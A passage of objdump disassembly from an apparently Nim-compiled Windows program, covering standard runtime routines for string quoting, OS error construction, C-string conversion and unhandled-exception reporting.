  404b35:	e9 0a 01 00 00       	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404b3a:	80 fa 5c             	cmp    $0x5c,%dl
  404b3d:	0f 84 cb 00 00 00    	je     404c0e <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x258>
  404b43:	80 fa 7e             	cmp    $0x7e,%dl
  404b46:	0f 8f 02 01 00 00    	jg     404c4e <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x298>
  404b4c:	e9 4a 01 00 00       	jmp    404c9b <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x2e5>
  404b51:	ba 02 00 00 00       	mov    $0x2,%edx
  404b56:	e8 4c fa ff ff       	call   4045a7 <resizeString>
  404b5b:	48 89 d9             	mov    %rbx,%rcx
  404b5e:	48 89 c2             	mov    %rax,%rdx
  404b61:	e8 5c e3 ff ff       	call   402ec2 <unsureAsgnRef>
  404b66:	48 8d 15 23 c7 00 00 	lea    0xc723(%rip),%rdx        # 411290 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_17>
  404b6d:	e9 d2 00 00 00       	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404b72:	ba 02 00 00 00       	mov    $0x2,%edx
  404b77:	e8 2b fa ff ff       	call   4045a7 <resizeString>
  404b7c:	48 89 d9             	mov    %rbx,%rcx
  404b7f:	48 89 c2             	mov    %rax,%rdx
  404b82:	e8 3b e3 ff ff       	call   402ec2 <unsureAsgnRef>
  404b87:	48 8d 15 e2 c6 00 00 	lea    0xc6e2(%rip),%rdx        # 411270 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_18>
  404b8e:	e9 b1 00 00 00       	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404b93:	ba 02 00 00 00       	mov    $0x2,%edx
  404b98:	e8 0a fa ff ff       	call   4045a7 <resizeString>
  404b9d:	48 89 d9             	mov    %rbx,%rcx
  404ba0:	48 89 c2             	mov    %rax,%rdx
  404ba3:	e8 1a e3 ff ff       	call   402ec2 <unsureAsgnRef>
  404ba8:	48 8d 15 a1 c6 00 00 	lea    0xc6a1(%rip),%rdx        # 411250 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_19>
  404baf:	e9 90 00 00 00       	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404bb4:	ba 02 00 00 00       	mov    $0x2,%edx
  404bb9:	e8 e9 f9 ff ff       	call   4045a7 <resizeString>
  404bbe:	48 89 d9             	mov    %rbx,%rcx
  404bc1:	48 89 c2             	mov    %rax,%rdx
  404bc4:	e8 f9 e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404bc9:	48 8d 15 60 c6 00 00 	lea    0xc660(%rip),%rdx        # 411230 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_20>
  404bd0:	eb 72                	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404bd2:	ba 02 00 00 00       	mov    $0x2,%edx
  404bd7:	e8 cb f9 ff ff       	call   4045a7 <resizeString>
  404bdc:	48 89 d9             	mov    %rbx,%rcx
  404bdf:	48 89 c2             	mov    %rax,%rdx
  404be2:	e8 db e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404be7:	48 8d 15 22 c6 00 00 	lea    0xc622(%rip),%rdx        # 411210 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_21>
  404bee:	eb 54                	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404bf0:	ba 02 00 00 00       	mov    $0x2,%edx
  404bf5:	e8 ad f9 ff ff       	call   4045a7 <resizeString>
  404bfa:	48 89 d9             	mov    %rbx,%rcx
  404bfd:	48 89 c2             	mov    %rax,%rdx
  404c00:	e8 bd e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404c05:	48 8d 15 e4 c5 00 00 	lea    0xc5e4(%rip),%rdx        # 4111f0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_22>
  404c0c:	eb 36                	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404c0e:	ba 02 00 00 00       	mov    $0x2,%edx
  404c13:	e8 8f f9 ff ff       	call   4045a7 <resizeString>
  404c18:	48 89 d9             	mov    %rbx,%rcx
  404c1b:	48 89 c2             	mov    %rax,%rdx
  404c1e:	e8 9f e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404c23:	4c 89 fa             	mov    %r15,%rdx
  404c26:	eb 1c                	jmp    404c44 <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x28e>
  404c28:	ba 02 00 00 00       	mov    $0x2,%edx
  404c2d:	e8 75 f9 ff ff       	call   4045a7 <resizeString>
  404c32:	48 89 d9             	mov    %rbx,%rcx
  404c35:	48 89 c2             	mov    %rax,%rdx
  404c38:	e8 85 e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404c3d:	48 8d 15 4c c5 00 00 	lea    0xc54c(%rip),%rdx        # 411190 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_25>
  404c44:	48 8b 0b             	mov    (%rbx),%rcx
  404c47:	e8 31 cd ff ff       	call   40197d <appendString.part.0>
  404c4c:	eb 5d                	jmp    404cab <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x2f5>
  404c4e:	ba 02 00 00 00       	mov    $0x2,%edx
  404c53:	e8 4f f9 ff ff       	call   4045a7 <resizeString>
  404c58:	48 89 d9             	mov    %rbx,%rcx
  404c5b:	48 89 c2             	mov    %rax,%rdx
  404c5e:	e8 5f e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404c63:	48 8b 0b             	mov    (%rbx),%rcx
  404c66:	4c 89 f2             	mov    %r14,%rdx
  404c69:	e8 0f cd ff ff       	call   40197d <appendString.part.0>
  404c6e:	48 0f be c6          	movsbq %sil,%rax
  404c72:	48 8b 0b             	mov    (%rbx),%rcx
  404c75:	83 e6 0f             	and    $0xf,%esi
  404c78:	48 c1 f8 04          	sar    $0x4,%rax
  404c7c:	41 0f be 54 04 10    	movsbl 0x10(%r12,%rax,1),%edx
  404c82:	e8 43 f6 ff ff       	call   4042ca <addChar>
  404c87:	48 89 d9             	mov    %rbx,%rcx
  404c8a:	48 89 c2             	mov    %rax,%rdx
  404c8d:	e8 30 e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404c92:	41 0f be 54 34 10    	movsbl 0x10(%r12,%rsi,1),%edx
  404c98:	48 8b 0b             	mov    (%rbx),%rcx
  404c9b:	e8 2a f6 ff ff       	call   4042ca <addChar>
  404ca0:	48 89 d9             	mov    %rbx,%rcx
  404ca3:	48 89 c2             	mov    %rax,%rdx
  404ca6:	e8 17 e2 ff ff       	call   402ec2 <unsureAsgnRef>
  404cab:	48 ff c7             	inc    %rdi
  404cae:	e9 97 fd ff ff       	jmp    404a4a <addQuoted__45fPtFhY4FavRaYwDhRfuA+0x94>

0000000000404cb3 <newOSError__JXEuze9ctNbkn51HYBflQLg>:
  404cb3:	55                   	push   %rbp
  404cb4:	57                   	push   %rdi
  404cb5:	56                   	push   %rsi
  404cb6:	53                   	push   %rbx
  404cb7:	48 83 ec 58          	sub    $0x58,%rsp
  404cbb:	31 ed                	xor    %ebp,%ebp
  404cbd:	89 8c 24 80 00 00 00 	mov    %ecx,0x80(%rsp)
  404cc4:	48 89 d7             	mov    %rdx,%rdi
  404cc7:	ba 38 00 00 00       	mov    $0x38,%edx
  404ccc:	48 8d 0d ad 06 02 00 	lea    0x206ad(%rip),%rcx        # 425380 <NTI__9clYsYwyjCqe2PFTuCI3Ubg_>
  404cd3:	e8 0e f0 ff ff       	call   403ce6 <newObj>
  404cd8:	44 8b 84 24 80 00 00 	mov    0x80(%rsp),%r8d
  404cdf:	00 
  404ce0:	48 89 c3             	mov    %rax,%rbx
  404ce3:	48 8d 05 16 07 02 00 	lea    0x20716(%rip),%rax        # 425400 <NTI__BeJgrOdDsczOwEWOZbRfKA_>
  404cea:	48 89 03             	mov    %rax,(%rbx)
  404ced:	48 8d 05 e6 73 00 00 	lea    0x73e6(%rip),%rax        # 40c0da <.rdata+0xda>
  404cf4:	45 85 c0             	test   %r8d,%r8d
  404cf7:	48 89 43 10          	mov    %rax,0x10(%rbx)
  404cfb:	44 89 43 30          	mov    %r8d,0x30(%rbx)
  404cff:	74 5c                	je     404d5d <newOSError__JXEuze9ctNbkn51HYBflQLg+0xaa>
  404d01:	45 31 c9             	xor    %r9d,%r9d
  404d04:	31 d2                	xor    %edx,%edx
  404d06:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
  404d0d:	00 
  404d0e:	31 ed                	xor    %ebp,%ebp
  404d10:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
  404d15:	b9 00 13 00 00       	mov    $0x1300,%ecx
  404d1a:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
  404d21:	00 00 
  404d23:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  404d2a:	00 00 
  404d2c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
  404d31:	ff 15 01 4f 02 00    	call   *0x24f01(%rip)        # 429c38 <Dl_14036835_>
  404d37:	85 c0                	test   %eax,%eax
  404d39:	74 22                	je     404d5d <newOSError__JXEuze9ctNbkn51HYBflQLg+0xaa>
  404d3b:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
  404d40:	ba 50 00 00 00       	mov    $0x50,%edx
  404d45:	e8 07 f6 ff ff       	call   404351 <dollar___NmQ9ct6KsQm3mcX4z6BEBbA.constprop.44>
  404d4a:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
  404d4f:	48 89 c5             	mov    %rax,%rbp
  404d52:	48 85 c9             	test   %rcx,%rcx
  404d55:	74 06                	je     404d5d <newOSError__JXEuze9ctNbkn51HYBflQLg+0xaa>
  404d57:	ff 15 d3 4e 02 00    	call   *0x24ed3(%rip)        # 429c30 <Dl_14037001_>
  404d5d:	48 8d 73 18          	lea    0x18(%rbx),%rsi
  404d61:	48 89 ea             	mov    %rbp,%rdx
  404d64:	48 89 f1             	mov    %rsi,%rcx
  404d67:	e8 94 e1 ff ff       	call   402f00 <asgnRef.lto_priv.65>
  404d6c:	48 85 ff             	test   %rdi,%rdi
  404d6f:	74 67                	je     404dd8 <newOSError__JXEuze9ctNbkn51HYBflQLg+0x125>
  404d71:	48 83 3f 00          	cmpq   $0x0,(%rdi)
  404d75:	7e 61                	jle    404dd8 <newOSError__JXEuze9ctNbkn51HYBflQLg+0x125>
  404d77:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  404d7b:	48 85 c9             	test   %rcx,%rcx
  404d7e:	74 24                	je     404da4 <newOSError__JXEuze9ctNbkn51HYBflQLg+0xf1>
  404d80:	48 8b 01             	mov    (%rcx),%rax
  404d83:	48 85 c0             	test   %rax,%rax
  404d86:	7e 1c                	jle    404da4 <newOSError__JXEuze9ctNbkn51HYBflQLg+0xf1>
  404d88:	80 7c 01 0f 0a       	cmpb   $0xa,0xf(%rcx,%rax,1)
  404d8d:	74 15                	je     404da4 <newOSError__JXEuze9ctNbkn51HYBflQLg+0xf1>
  404d8f:	ba 0a 00 00 00       	mov    $0xa,%edx
  404d94:	e8 31 f5 ff ff       	call   4042ca <addChar>
  404d99:	48 89 f1             	mov    %rsi,%rcx
  404d9c:	48 89 c2             	mov    %rax,%rdx
  404d9f:	e8 5c e1 ff ff       	call   402f00 <asgnRef.lto_priv.65>
  404da4:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  404da8:	ba 11 00 00 00       	mov    $0x11,%edx
  404dad:	e8 f5 f7 ff ff       	call   4045a7 <resizeString>
  404db2:	48 89 f1             	mov    %rsi,%rcx
  404db5:	48 89 c2             	mov    %rax,%rdx
  404db8:	e8 43 e1 ff ff       	call   402f00 <asgnRef.lto_priv.65>
  404dbd:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
  404dc1:	48 8d 15 78 c5 00 00 	lea    0xc578(%rip),%rdx        # 411340 <TM__yu6cxgKBBXbNsTkT9cyMd4g_4>
  404dc8:	e8 b0 cb ff ff       	call   40197d <appendString.part.0>
  404dcd:	48 89 fa             	mov    %rdi,%rdx
  404dd0:	48 89 f1             	mov    %rsi,%rcx
  404dd3:	e8 de fb ff ff       	call   4049b6 <addQuoted__45fPtFhY4FavRaYwDhRfuA>
  404dd8:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  404ddc:	48 85 f6             	test   %rsi,%rsi
  404ddf:	74 06                	je     404de7 <newOSError__JXEuze9ctNbkn51HYBflQLg+0x134>
  404de1:	48 83 3e 00          	cmpq   $0x0,(%rsi)
  404de5:	75 1d                	jne    404e04 <newOSError__JXEuze9ctNbkn51HYBflQLg+0x151>
  404de7:	48 8d 0d 12 c5 00 00 	lea    0xc512(%rip),%rcx        # 411300 <TM__yu6cxgKBBXbNsTkT9cyMd4g_5>
  404dee:	e8 4d ee ff ff       	call   403c40 <copyStringRC1>
  404df3:	48 85 f6             	test   %rsi,%rsi
  404df6:	48 89 43 18          	mov    %rax,0x18(%rbx)
  404dfa:	74 08                	je     404e04 <newOSError__JXEuze9ctNbkn51HYBflQLg+0x151>
  404dfc:	48 89 f1             	mov    %rsi,%rcx
  404dff:	e8 2d e1 ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.80>
  404e04:	48 89 d8             	mov    %rbx,%rax
  404e07:	48 83 c4 58          	add    $0x58,%rsp
  404e0b:	5b                   	pop    %rbx
  404e0c:	5e                   	pop    %rsi
  404e0d:	5f                   	pop    %rdi
  404e0e:	5d                   	pop    %rbp
  404e0f:	c3                   	ret

0000000000404e10 <cstrToNimstr>:
  404e10:	57                   	push   %rdi
  404e11:	56                   	push   %rsi
  404e12:	53                   	push   %rbx
  404e13:	48 83 ec 20          	sub    $0x20,%rsp
  404e17:	31 c0                	xor    %eax,%eax
  404e19:	48 85 c9             	test   %rcx,%rcx
  404e1c:	48 89 ce             	mov    %rcx,%rsi
  404e1f:	74 2a                	je     404e4b <cstrToNimstr+0x3b>
  404e21:	48 89 f7             	mov    %rsi,%rdi
  404e24:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  404e28:	f2 ae                	repnz scas (%rdi),%al
  404e2a:	48 89 cb             	mov    %rcx,%rbx
  404e2d:	48 f7 d3             	not    %rbx
  404e30:	48 8d 7b ff          	lea    -0x1(%rbx),%rdi
  404e34:	48 89 f9             	mov    %rdi,%rcx
  404e37:	e8 17 f2 ff ff       	call   404053 <rawNewStringNoInit>
  404e3c:	48 89 d9             	mov    %rbx,%rcx
  404e3f:	48 8d 50 10          	lea    0x10(%rax),%rdx
  404e43:	48 89 38             	mov    %rdi,(%rax)
  404e46:	48 89 d7             	mov    %rdx,%rdi
  404e49:	f3 a4                	rep movsb (%rsi),(%rdi)
  404e4b:	48 83 c4 20          	add    $0x20,%rsp
  404e4f:	5b                   	pop    %rbx
  404e50:	5e                   	pop    %rsi
  404e51:	5f                   	pop    %rdi
  404e52:	c3                   	ret

0000000000404e53 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3>:
  404e53:	41 57                	push   %r15
  404e55:	41 56                	push   %r14
  404e57:	41 55                	push   %r13
  404e59:	41 54                	push   %r12
  404e5b:	55                   	push   %rbp
  404e5c:	57                   	push   %rdi
  404e5d:	56                   	push   %rsi
  404e5e:	53                   	push   %rbx
  404e5f:	48 81 ec 18 08 00 00 	sub    $0x818,%rsp
  404e66:	ba d1 07 00 00       	mov    $0x7d1,%edx
  404e6b:	48 8d 6c 24 3f       	lea    0x3f(%rsp),%rbp
  404e70:	49 89 cc             	mov    %rcx,%r12
  404e73:	48 89 e9             	mov    %rbp,%rcx
  404e76:	e8 47 cb ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  404e7b:	49 8b 5c 24 20       	mov    0x20(%r12),%rbx
  404e80:	48 85 db             	test   %rbx,%rbx
  404e83:	75 07                	jne    404e8c <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x39>
  404e85:	31 d2                	xor    %edx,%edx
  404e87:	e9 da 01 00 00       	jmp    405066 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x213>
  404e8c:	48 83 3b 00          	cmpq   $0x0,(%rbx)
  404e90:	74 f3                	je     404e85 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x32>
  404e92:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
  404e97:	48 83 c3 10          	add    $0x10,%rbx
  404e9b:	31 f6                	xor    %esi,%esi
  404e9d:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
  404ea4:	00 00 
  404ea6:	e8 a1 ee ff ff       	call   403d4c <rawNewString>
  404eab:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
  404eb0:	41 bf 01 00 00 00    	mov    $0x1,%r15d
  404eb6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404ebb:	48 8b 43 f0          	mov    -0x10(%rbx),%rax
  404ebf:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  404ec4:	48 39 74 24 28       	cmp    %rsi,0x28(%rsp)
  404ec9:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
  404ece:	7f 10                	jg     404ee0 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x8d>
  404ed0:	31 d2                	xor    %edx,%edx
  404ed2:	4d 85 c0             	test   %r8,%r8
  404ed5:	0f 85 53 01 00 00    	jne    40502e <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x1db>
  404edb:	e9 5e 01 00 00       	jmp    40503e <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x1eb>
  404ee0:	48 8b 43 08          	mov    0x8(%rbx),%rax
  404ee4:	48 83 f8 f6          	cmp    $0xfffffffffffffff6,%rax
  404ee8:	74 08                	je     404ef2 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x9f>
  404eea:	48 83 f8 9c          	cmp    $0xffffffffffffff9c,%rax
  404eee:	75 20                	jne    404f10 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0xbd>
  404ef0:	eb 2b                	jmp    404f1d <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0xca>
  404ef2:	ba 11 00 00 00       	mov    $0x11,%edx
  404ef7:	4c 89 c1             	mov    %r8,%rcx
  404efa:	e8 a8 f6 ff ff       	call   4045a7 <resizeString>
  404eff:	48 8d 15 9a c1 00 00 	lea    0xc19a(%rip),%rdx        # 4110a0 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_11>
  404f06:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404f0b:	e9 0a 01 00 00       	jmp    40501a <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x1c7>
  404f10:	45 31 ed             	xor    %r13d,%r13d
  404f13:	4d 85 c0             	test   %r8,%r8
  404f16:	74 23                	je     404f3b <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0xe8>
  404f18:	4d 8b 28             	mov    (%r8),%r13
  404f1b:	eb 1e                	jmp    404f3b <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0xe8>
  404f1d:	ba 03 00 00 00       	mov    $0x3,%edx
  404f22:	4c 89 c1             	mov    %r8,%rcx
  404f25:	e8 7d f6 ff ff       	call   4045a7 <resizeString>
  404f2a:	48 8d 15 3f c1 00 00 	lea    0xc13f(%rip),%rdx        # 411070 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_12>
  404f31:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404f36:	e9 df 00 00 00       	jmp    40501a <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x1c7>
  404f3b:	48 8b 53 10          	mov    0x10(%rbx),%rdx
  404f3f:	48 85 d2             	test   %rdx,%rdx
  404f42:	74 08                	je     404f4c <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0xf9>
  404f44:	48 89 f9             	mov    %rdi,%rcx
  404f47:	e8 28 f6 ff ff       	call   404574 <add__8FwY5enLGB0dFerO6Ny9caw.part.19>
  404f4c:	48 83 7b 08 00       	cmpq   $0x0,0x8(%rbx)
  404f51:	7e 58                	jle    404fab <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x158>
  404f53:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  404f58:	ba 28 00 00 00       	mov    $0x28,%edx
  404f5d:	e8 68 f3 ff ff       	call   4042ca <addChar>
  404f62:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
  404f66:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404f6b:	e8 3f f2 ff ff       	call   4041af <nimIntToStr>
  404f70:	31 d2                	xor    %edx,%edx
  404f72:	48 85 c0             	test   %rax,%rax
  404f75:	49 89 c6             	mov    %rax,%r14
  404f78:	74 03                	je     404f7d <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x12a>
  404f7a:	48 8b 10             	mov    (%rax),%rdx
  404f7d:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  404f82:	e8 20 f6 ff ff       	call   4045a7 <resizeString>
  404f87:	4c 89 f2             	mov    %r14,%rdx
  404f8a:	48 89 c1             	mov    %rax,%rcx
  404f8d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404f92:	e8 0c ca ff ff       	call   4019a3 <appendString.lto_priv.49>
  404f97:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  404f9c:	ba 29 00 00 00       	mov    $0x29,%edx
  404fa1:	e8 24 f3 ff ff       	call   4042ca <addChar>
  404fa6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404fab:	48 8b 54 24 30       	mov    0x30(%rsp),%rdx
  404fb0:	31 c0                	xor    %eax,%eax
  404fb2:	48 85 d2             	test   %rdx,%rdx
  404fb5:	74 03                	je     404fba <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x167>
  404fb7:	48 8b 02             	mov    (%rdx),%rax
  404fba:	4c 29 e8             	sub    %r13,%rax
  404fbd:	41 bd 19 00 00 00    	mov    $0x19,%r13d
  404fc3:	41 be 01 00 00 00    	mov    $0x1,%r14d
  404fc9:	49 29 c5             	sub    %rax,%r13
  404fcc:	4d 85 ed             	test   %r13,%r13
  404fcf:	4d 0f 4e ef          	cmovle %r15,%r13
  404fd3:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  404fd8:	ba 20 00 00 00       	mov    $0x20,%edx
  404fdd:	49 ff c6             	inc    %r14
  404fe0:	e8 e5 f2 ff ff       	call   4042ca <addChar>
  404fe5:	4d 39 f5             	cmp    %r14,%r13
  404fe8:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  404fed:	7d e4                	jge    404fd3 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x180>
  404fef:	48 8b 13             	mov    (%rbx),%rdx
  404ff2:	48 85 d2             	test   %rdx,%rdx
  404ff5:	74 08                	je     404fff <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x1ac>
  404ff7:	48 89 f9             	mov    %rdi,%rcx
  404ffa:	e8 75 f5 ff ff       	call   404574 <add__8FwY5enLGB0dFerO6Ny9caw.part.19>
  404fff:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
  405004:	ba 01 00 00 00       	mov    $0x1,%edx
  405009:	e8 99 f5 ff ff       	call   4045a7 <resizeString>
  40500e:	48 8d 15 3b c0 00 00 	lea    0xc03b(%rip),%rdx        # 411050 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_13>
  405015:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  40501a:	48 89 c1             	mov    %rax,%rcx
  40501d:	48 ff c6             	inc    %rsi
  405020:	48 83 c3 18          	add    $0x18,%rbx
  405024:	e8 54 c9 ff ff       	call   40197d <appendString.part.0>
  405029:	e9 96 fe ff ff       	jmp    404ec4 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x71>
  40502e:	49 8b 10             	mov    (%r8),%rdx
  405031:	48 81 fa cf 07 00 00 	cmp    $0x7cf,%rdx
  405038:	0f 8f 47 fe ff ff    	jg     404e85 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x32>
  40503e:	4c 89 c1             	mov    %r8,%rcx
  405041:	48 89 ef             	mov    %rbp,%rdi
  405044:	e8 08 c5 ff ff       	call   401551 <nimToCStringConv.lto_priv.53>
  405049:	4d 85 c0             	test   %r8,%r8
  40504c:	48 89 c6             	mov    %rax,%rsi
  40504f:	48 89 d1             	mov    %rdx,%rcx
  405052:	f3 a4                	rep movsb (%rsi),(%rdi)
  405054:	0f 84 2b fe ff ff    	je     404e85 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x32>
  40505a:	49 8b 10             	mov    (%r8),%rdx
  40505d:	48 81 fa b3 07 00 00 	cmp    $0x7b3,%rdx
  405064:	7f 1a                	jg     405080 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x22d>
  405066:	48 8d 44 15 00       	lea    0x0(%rbp,%rdx,1),%rax
  40506b:	b9 07 00 00 00       	mov    $0x7,%ecx
  405070:	48 83 c2 1c          	add    $0x1c,%rdx
  405074:	48 8d 35 67 70 00 00 	lea    0x7067(%rip),%rsi        # 40c0e2 <.rdata+0xe2>
  40507b:	48 89 c7             	mov    %rax,%rdi
  40507e:	f3 a5                	rep movsl (%rsi),(%rdi)
  405080:	4d 8b 4c 24 18       	mov    0x18(%r12),%r9
  405085:	45 31 c0             	xor    %r8d,%r8d
  405088:	4d 85 c9             	test   %r9,%r9
  40508b:	74 03                	je     405090 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x23d>
  40508d:	4d 8b 01             	mov    (%r9),%r8
  405090:	4a 8d 04 02          	lea    (%rdx,%r8,1),%rax
  405094:	48 3d cf 07 00 00    	cmp    $0x7cf,%rax
  40509a:	7f 25                	jg     4050c1 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x26e>
  40509c:	4c 89 c9             	mov    %r9,%rcx
  40509f:	e8 ad c4 ff ff       	call   401551 <nimToCStringConv.lto_priv.53>
  4050a4:	48 89 c6             	mov    %rax,%rsi
  4050a7:	4c 89 c1             	mov    %r8,%rcx
  4050aa:	48 8d 44 15 00       	lea    0x0(%rbp,%rdx,1),%rax
  4050af:	48 89 c7             	mov    %rax,%rdi
  4050b2:	31 c0                	xor    %eax,%eax
  4050b4:	4d 85 c9             	test   %r9,%r9
  4050b7:	f3 a4                	rep movsb (%rsi),(%rdi)
  4050b9:	74 03                	je     4050be <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x26b>
  4050bb:	49 8b 01             	mov    (%r9),%rax
  4050be:	48 01 c2             	add    %rax,%rdx
  4050c1:	48 81 fa cd 07 00 00 	cmp    $0x7cd,%rdx
  4050c8:	7f 0b                	jg     4050d5 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x282>
  4050ca:	66 c7 44 15 00 20 5b 	movw   $0x5b20,0x0(%rbp,%rdx,1)
  4050d1:	48 83 c2 02          	add    $0x2,%rdx
  4050d5:	4d 8b 44 24 10       	mov    0x10(%r12),%r8
  4050da:	31 c9                	xor    %ecx,%ecx
  4050dc:	4d 85 c0             	test   %r8,%r8
  4050df:	74 17                	je     4050f8 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x2a5>
  4050e1:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  4050e5:	31 c0                	xor    %eax,%eax
  4050e7:	4c 89 c7             	mov    %r8,%rdi
  4050ea:	f2 ae                	repnz scas (%rdi),%al
  4050ec:	48 89 cb             	mov    %rcx,%rbx
  4050ef:	48 f7 d3             	not    %rbx
  4050f2:	48 89 d9             	mov    %rbx,%rcx
  4050f5:	48 ff c9             	dec    %rcx
  4050f8:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
  4050fc:	48 3d cf 07 00 00    	cmp    $0x7cf,%rax
  405102:	7f 23                	jg     405127 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x2d4>
  405104:	48 8d 44 15 00       	lea    0x0(%rbp,%rdx,1),%rax
  405109:	4c 89 c6             	mov    %r8,%rsi
  40510c:	48 89 c7             	mov    %rax,%rdi
  40510f:	31 c0                	xor    %eax,%eax
  405111:	f3 a4                	rep movsb (%rsi),(%rdi)
  405113:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  405117:	4c 89 c7             	mov    %r8,%rdi
  40511a:	f2 ae                	repnz scas (%rdi),%al
  40511c:	48 89 c8             	mov    %rcx,%rax
  40511f:	48 f7 d0             	not    %rax
  405122:	48 8d 54 02 ff       	lea    -0x1(%rdx,%rax,1),%rdx
  405127:	48 81 fa cd 07 00 00 	cmp    $0x7cd,%rdx
  40512e:	7f 07                	jg     405137 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3+0x2e4>
  405130:	66 c7 44 15 00 5d 0a 	movw   $0xa5d,0x0(%rbp,%rdx,1)
  405137:	48 89 e9             	mov    %rbp,%rcx
  40513a:	e8 8d 04 00 00       	call   4055cc <showErrorMessage__zsORN9crdKxsL9cHrQcdHSMw>
  40513f:	90                   	nop
  405140:	48 81 c4 18 08 00 00 	add    $0x818,%rsp
  405147:	5b                   	pop    %rbx
